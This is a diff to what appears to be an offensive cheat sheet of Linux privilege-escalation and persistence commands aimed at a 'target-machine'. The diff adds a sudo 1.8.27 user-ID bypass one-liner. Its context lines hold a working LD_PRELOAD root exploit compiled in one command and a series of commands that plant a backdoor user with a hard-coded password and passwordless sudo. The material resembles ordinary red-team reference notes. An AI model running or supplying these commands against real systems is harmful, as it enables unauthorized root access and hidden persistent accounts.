@@ -54,6 +54,7 @@ Capabilities:capsh --print # Print current capabilities; target-machine
 Sudo:sudo -l # List sudo permissions. Look for NOPASSWD entries and exploitable commands; target-machine
 Sudo:sudo -l | grep -i "env_keep.*LD_PRELOAD" # Check if LD_PRELOAD preserved in sudo; target-machine
 Sudo:sudo <command> # Run command with sudo if allowed; target-machine
+Sudo version 1.8.27: sudo -u#-1 /bin/bash #sudo bypass; target-machine
 Sudo LD_PRELOAD # 1:gcc -shared -fPIC -o /tmp/lib.so shell.c -nostartfiles && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # LD_PRELOAD exploit; target-machine
 Sudo LD_PRELOAD # 2:sudo -l | grep env_keep.*LD_PRELOAD # Check if LD_PRELOAD is preserved in sudo; target-machine
 Sudo LD_PRELOAD # 2:gcc -shared -fPIC -o /tmp/lib.so -x c - <<< $'# include <stdio.h>\n# include <sys/types.h>\n# include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }' && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # Compile and run LD_PRELOAD exploit in one line; target-machine
@@ -153,5 +154,5 @@ Create User #1 (requires root):echo 'edwin:P@ssw0rd@123' | chpasswd #set passwor
 Create User #1 (requires root):usermod -aG sudo edwin #add user to sudo group for root privileges (Debian/Ubuntu); target-machine
 Create User #1 (requires root):usermod -aG wheel edwin #add user to wheel group for root privileges (RHEL/CentOS); target-machine
 Create User #1 (requires root):echo 'edwin ALL=(ALL:ALL) ALL' >> /etc/sudoers #grant full sudo privileges via sudoers file; target-machine
-Create User #2 (requires root):echo 'edwin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/edwin #grant passwordless sudo safely using sudoers.d; target-machine
+Create User #2 (requires root):echo 'edwin ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/edwin #grant passwordless sudo safely using sudoers.d; target-machine
 Create User #2 (requires root):chmod 440 /etc/sudoers.d/edwin #set correct permissions for sudoers file; target-machine
